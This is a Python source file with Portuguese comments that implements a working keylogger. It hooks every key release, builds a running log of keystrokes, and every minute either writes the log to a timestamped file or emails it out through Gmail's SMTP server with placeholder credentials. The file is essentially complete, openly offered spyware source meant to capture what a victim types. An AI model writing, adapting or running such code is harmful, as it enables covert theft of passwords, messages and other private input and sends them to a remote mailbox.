import keyboard
import smtplib # para enviar o email via SMTP (gmail)
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 # 1 minuto em segundos
EMAIL_ADDRESS = "put_real_address_here@gmail.com"
EMAIL_PASSWORD = "put_real_pw"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # SEND_REPORT_EVERY recebe o timer
        self.interval = interval
        self.report_method = report_method
        # contem todos os logs 
        # registrados em `self.interval`
        self.log = ""
        # grava o começo e fim com o datetime
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        callback chamado sempre que ocorre um evento
        (quando uma tecla e solta por exemplo)
        """
        name = event.name
        if len(name) > 1:
            # nao e letra, teclas como ctrl esc e etc
            # maiusculo com []
            if name == "space":
                # " " ao inves de "espaco"
                name = " "
            elif name == "enter":
                # adiciona linha ao pressionar enter
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # substituir com underline
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # adiciona um nome na variavel global `self.log`
        self.log += name
    
    def update_filename(self):
        # constroi o arquivo para identificar o periodo com datetime
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """cria um arquivo de log que contem
        todos os registros na variavel `self.log`"""
        # Abre o arquivo em modo escrita
        with open(f"{self.filename}.txt", "w") as f:
            # Escreve os dados capturados
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # gerencia conexao com o SMTP
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # conecta ao servidor SMTP como TLS
        server.starttls()
        # loga no email
        server.login(email, password)
        # envia a mensagem
        server.sendmail(email, email, message)
        # encerra a sessao
        server.quit()

    def report(self):
        if self.log:
            # se tem algo no log gera aqui
            self.end_dt = datetime.now()
            # atualiza `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # para imprimir no console, descomenta abaixo
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # configura a thread como daemon (morre junto da thread)
        timer.daemon = True
        # inicia o timer
        timer.start()

    def start(self):
        # registra o inicio do datetime
        self.start_dt = datetime.now()
        # inicia o keylogger
        keyboard.on_release(callback=self.callback)
        # inicia a captura
        self.report()
        # bloqueia a thread ate dar ctrl+c
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
